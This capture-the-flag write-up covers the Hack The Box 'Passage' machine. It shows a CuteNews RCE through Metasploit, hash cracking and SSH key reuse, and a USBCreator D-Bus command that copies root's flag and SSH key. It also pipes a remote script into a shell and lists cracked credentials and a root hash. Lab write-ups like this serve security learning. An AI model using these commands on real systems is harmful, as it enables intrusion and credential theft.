# Passage 

### Initial recon
From the nmap scan we get only two ports: 22(SSH) and 80(WEB)

### Getting the foothold
On the port 80 it seems that we have a news website that uses a Fail2Ban to prevent denial of service. With this in mind we can't run a web-recon tool like gobuster or wfuzz. But we get an information on the footer that this website runs `CuteNews`. There a quite a few vulnerable exploits and a metasploit module. 
In order to find the version of we can access `http://passage.htb/CuteNews` from which we get `Powered by CuteNews 2.1.2 © 2002–2020 CutePHP`.
Fire up the metasploit and trying to launch the module `exploits/unix/webapp/cutenews_avatar_rce` we get an error, that has a solution on the offical github page [Cannot load new module to metasploit- CuteNews 2.1.2](https://github.com/rapid7/metasploit-framework/issues/13246).
Now we just need to create a new account on the website [CuteNews - Register](http://passage.htb/CuteNews/?register) & setup the credentials for the exploit. 
We got the shell as **www-data**

### Privesc from www-data to paul

At first I want to make the shell interactive so I've switched form meterpreter shell to /bin/bash using `execute -f /bin/bash -i -H` and spawned a python shell `python3 -c 'import pty; pty.spawn("/bin/bash")'`.
Now that we have everything setup we can fireup the LinPeas script using `curl http://10.10.x.x/LinPeas.sh |sh > /tmp/log.txt`. This gave me the hint that CuteNews doesn't use a database and have everything setup in base64 and PHP serialized objects that can be found in `/var/www/html/CuteNews/cdata/users/`. From a quick list of elements I get that `lines` contains all files from the database. Here we get 4 hashes but only two can be cracked (atlanta1 and egre55). 
We got the user **paul**, and we can always login using `ssh -i PaulRSA paul@passage.htb`.

### Privesc from paul to nadav
At first I was relieved to see that paul has it s own ssh key and I downloaded it to get redundancy. But after trying to enum everything I just tried to ssh into **nadav** using **paul**'s ssh key. And it worked... how dumb was that. Now we can also do `ssh -i PaulRSA nadav@passage.htb`

### Getting the root
Well after some more enum I've found that under the `/home/nadav/.viminfo` that interesting file `/etc/dbus-1/system.d/com.ubuntu.USBCreator.conf` which at first doesn't reveal any sensitive information, but after a brief google search we get to this [article](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/). Now typing the command `gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /a.txt true` we get the flag. 
Further more, if I got the root ssh keys using `gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /a.txt true` and now we have redundancy. 

PWNED <3

### Credentials & Hashes

- paul:atlanta1 (e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd)
- $6$mjc8Tvgr$L56bn5KQDtOyKRdXBTL4xcmT7FVWJbds.Fo0FVc11PWliaNu5ASAxKzaEddyaYGMxGQPUNo5UpxT/nawzS8TW0 (root hash)